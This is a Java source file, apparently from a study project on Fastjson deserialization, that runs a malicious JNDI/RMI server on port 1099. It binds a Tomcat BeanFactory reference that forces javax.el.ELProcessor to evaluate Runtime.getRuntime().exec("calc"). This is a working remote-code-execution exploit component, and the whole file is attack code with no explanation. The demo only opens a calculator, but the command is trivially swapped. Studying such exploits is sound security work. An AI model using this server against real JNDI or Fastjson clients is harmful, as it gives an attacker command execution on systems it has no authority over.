package com.endlessshw.fastjsonprinciple.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2023/5/15 10:50
 */
public class JNDIServer {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            InitialContext initialContext = new InitialContext();
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
                    "org.apache.naming.factory.BeanFactory", null);
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
            initialContext.rebind("rmi://localhost:1099/myRemote", new ReferenceWrapper(resourceRef));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
